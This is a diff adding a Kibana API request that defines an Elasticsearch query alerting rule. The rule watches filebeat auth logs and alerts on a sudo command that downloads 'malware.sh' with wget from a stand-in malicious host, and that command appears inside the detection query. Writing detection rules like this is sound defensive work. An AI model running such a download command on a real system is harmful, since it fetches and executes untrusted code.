@@ -1,0 +1,70 @@
+PUT kbn:/api/alerting/rule/<redacted>
+{
+  "name": "Elasticsearch query rule",
+  "tags": [],
+  "schedule": {
+    "interval": "1m"
+  },
+  "params": {
+    "searchConfiguration": {
+      "query": {
+        "query": "system.auth.sudo.command: \"/usr/bin/wget http://malicious-site.com/malware.sh\"",
+        "language": "kuery"
+      },
+      "index": "filebeat-*"
+    },
+    "timeField": "@timestamp",
+    "searchType": "searchSource",
+    "timeWindowSize": 5,
+    "timeWindowUnit": "m",
+    "threshold": [
+      1
+    ],
+    "thresholdComparator": ">",
+    "size": 100,
+    "aggType": "count",
+    "groupBy": "all",
+    "termSize": 5,
+    "excludeHitsFromPreviousRun": false,
+    "sourceFields": [
+      {
+        "label": "container.id",
+        "searchPath": "container.id"
+      },
+      {
+        "label": "host.hostname",
+        "searchPath": "host.hostname"
+      },
+      {
+        "label": "host.id",
+        "searchPath": "host.id"
+      },
+      {
+        "label": "host.name",
+        "searchPath": "host.name"
+      },
+      {
+        "label": "kubernetes.pod.uid",
+        "searchPath": "kubernetes.pod.uid"
+      }
+    ]
+  },
+  "actions": [
+    {
+      "group": "query matched",
+      "id": "<redacted>",
+      "params": {
+        "message": "Elasticsearch query rule {{rule.name}} is active:\n\n- Value: {{context.value}}\n- Conditions Met: {{context.conditions}} over {{rule.params.timeWindowSize}}'{{rule.params.timeWindowUnit}}\n- Timestamp: {{context.date}}\n- Link: {{context.link}}"
+      },
+      "frequency": {
+        "notify_when": "onActionGroupChange",
+        "throttle": null,
+        "summary": false
+      },
+      "uuid": "<redacted>"
+    }
+  ],
+  "alert_delay": {
+    "active": 1
+  }
+}
